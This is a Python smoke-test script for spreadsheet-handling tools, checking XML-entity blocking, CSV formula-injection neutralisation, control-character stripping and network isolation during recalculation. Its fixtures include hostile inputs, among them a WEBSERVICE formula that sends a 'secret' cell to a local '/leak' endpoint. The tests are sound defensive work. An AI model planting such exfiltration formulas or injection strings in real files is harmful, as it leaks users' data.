#!/usr/bin/env python3
"""Smoke tests for the bundled scripts. Run: python tests/smoke_test.py
Builds fixtures in a temp folder; recalc checks are skipped if LibreOffice is absent.
Requires: openpyxl, defusedxml."""
import http.server
import importlib.util
import json
import shutil
import subprocess
import sys
import tempfile
import threading
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
S = ROOT / "scripts"
PY = sys.executable


def run(*args):
    return subprocess.run([PY, *map(str, args)], capture_output=True, text=True)


def main():
    from openpyxl import Workbook
    tmp = Path(tempfile.mkdtemp(prefix="xl-smoke-"))
    ok = True

    def check(name, cond):
        nonlocal ok
        print(("PASS " if cond else "FAIL ") + name)
        ok &= bool(cond)

    wb = Workbook()
    ws = wb.active
    ws["A1"], ws["A2"], ws["A3"] = 2, 3, "=A1*A2"
    ws.merge_cells("C1:D1")
    wb.create_sheet("Hidden").sheet_state = "hidden"
    f = tmp / "f.xlsx"
    wb.save(f)

    r = run(S / "inspect_xlsx.py", f, "--json")
    d = json.loads(r.stdout)
    check("inspect json ok", r.returncode == 0 and d["ok"])
    check("inspect sees formula without cache", d["sheets"][0]["formulas_without_cached_value"] == 1)
    check("inspect sees hidden sheet and merge", d["sheets"][1]["state"] == "hidden" and d["sheets"][0]["merged_ranges"] == 1)

    bomb = tmp / "bomb.xlsx"
    with zipfile.ZipFile(f) as src, zipfile.ZipFile(bomb, "w") as dst:
        for i in src.infolist():
            data = src.read(i.filename)
            if i.filename == "xl/workbook.xml":
                body = data.split(b"?>", 1)[1] if data.startswith(b"<?xml") else data
                data = b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "aaaa">]>' + body
            dst.writestr(i, data)
    check("inspect blocks XML entities", run(S / "inspect_xlsx.py", bomb).returncode == 2)
    check("inspect size cap", run(S / "inspect_xlsx.py", f, "--max-mb", "0").returncode == 3)
    ole = tmp / "enc.xlsx"
    ole.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\0" * 64)
    check("inspect flags OLE2/encrypted", run(S / "inspect_xlsx.py", ole).returncode == 2)

    csvf = tmp / "in.csv"
    csvf.write_text('ID;Amount;Note\n000123;1.250,50;=HYPERLINK("x")\n', encoding="utf-8")
    out = tmp / "out.xlsx"
    r = run(S / "csv_to_xlsx.py", csvf, out, "--number-cols", "Amount", "--decimal", ",")
    from openpyxl import load_workbook
    c = load_workbook(out).active
    check("csv keeps leading zeros", c["A2"].value == "000123")
    check("csv parses decimal comma", c["B2"].value == 1250.5)
    check("csv neutralizes formula injection", c["C2"].data_type == "s")
    check("csv refuses overwrite", run(S / "csv_to_xlsx.py", csvf, out).returncode != 0)
    mlf = tmp / "ml.csv"
    mlf.write_bytes(b'ID,Note\r\n1,"line one\r\nline two"\r\n2,x\r\n')
    r = run(S / "csv_to_xlsx.py", mlf, tmp / "ml.xlsx")
    m = load_workbook(tmp / "ml.xlsx").active
    check("csv keeps multiline quoted fields", r.returncode == 0 and m.max_row == 3 and "line two" in m["B2"].value and m["A3"].value == "2")

    # clean() strips C1 controls, bidi and zero-width characters (Tariq I1)
    spec = importlib.util.spec_from_file_location("inspect_xlsx", S / "inspect_xlsx.py")
    ins = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(ins)
    nasty = "a\x9b31mb\x85c\u202ed\u2066e\u200bf\u200dg\ufeffh\u2060i\x1bj"
    check("clean strips C1, bidi and zero-width chars", not any(ch in ins.clean(nasty) for ch in nasty if ch not in "abcdefghij31m "))
    check("clean keeps normal text", ins.clean("Total \u00e9t\u00e9 \u0627\u0644") == "Total \u00e9t\u00e9 \u0627\u0644")

    # --show-links: count by default, targets only on request
    d = json.loads(run(S / "inspect_xlsx.py", f, "--json").stdout)
    check("inspect hides link targets by default", d["external_link_targets"].startswith("hidden") and d["external_links"] == 0)

    spec = importlib.util.spec_from_file_location("recalc", S / "recalc.py")
    rc = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(rc)
    check("recalc profile sets link updates to never", 'Content/Update"><prop oor:name="Link" oor:op="fuse"><value>1<' in rc.XCU)

    # verify(): literal "=text" is not a formula; formulas after short rows are still counted (zip fix)
    vw = Workbook()
    vs = vw.active
    vs["A1"] = "=literal"
    vs["A1"].data_type = "s"
    vs["A2"], vs["E9"] = 1, "=A2+1"
    vf = tmp / "v.xlsx"
    vw.save(vf)
    check("recalc verify counts by data_type and coordinate", rc.verify(vf) == (1, 1, 0))

    if shutil.which("soffice") or shutil.which("libreoffice"):
        r = run(S / "recalc.py", f, tmp / "rc")
        v = load_workbook(tmp / "rc" / "f.xlsx", data_only=True).active["A3"].value
        check("recalc fills cached value", r.returncode == 0 and v == 6)

        # never deletes an existing output unless --force (Tariq R2)
        keep = tmp / "rc2" / "f.xlsx"
        keep.parent.mkdir()
        keep.write_bytes(b"user data")
        r = run(S / "recalc.py", f, tmp / "rc2")
        check("recalc refuses to replace existing output", r.returncode != 0 and keep.read_bytes() == b"user data")
        r = run(S / "recalc.py", f, tmp / "rc2", "--force")
        check("recalc --force replaces output", r.returncode == 0 and zipfile.is_zipfile(keep))

        prefix = rc.no_network_prefix()
        if prefix:
            hits = []

            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self):
                    hits.append(self.path)
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"x")

                def log_message(self, *args):
                    pass

            srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
            threading.Thread(target=srv.serve_forever, daemon=True).start()
            port = srv.server_address[1]
            probe = f"import socket; socket.create_connection(('127.0.0.1', {port}), timeout=3)"
            p = subprocess.run(prefix + [PY, "-c", probe], capture_output=True, text=True)
            check("no-network namespace blocks connections", p.returncode != 0 and not hits)
            ww = Workbook()
            ww.active["A1"] = "secret"
            ww.active["B1"] = f'=_xlfn.WEBSERVICE("http://127.0.0.1:{port}/leak?"&A1)'
            wf = tmp / "web.xlsx"
            ww.save(wf)
            r = run(S / "recalc.py", wf, tmp / "rc3")
            check("recalc WEBSERVICE sends no request", r.returncode in (0, 1) and not hits)
            srv.shutdown()
        else:
            r = run(S / "recalc.py", f, tmp / "rc4")
            check("recalc refuses without network isolation", r.returncode != 0 and "--sandboxed" in r.stderr)
    else:
        print("SKIP recalc (LibreOffice not installed)")
    shutil.rmtree(tmp, ignore_errors=True)
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
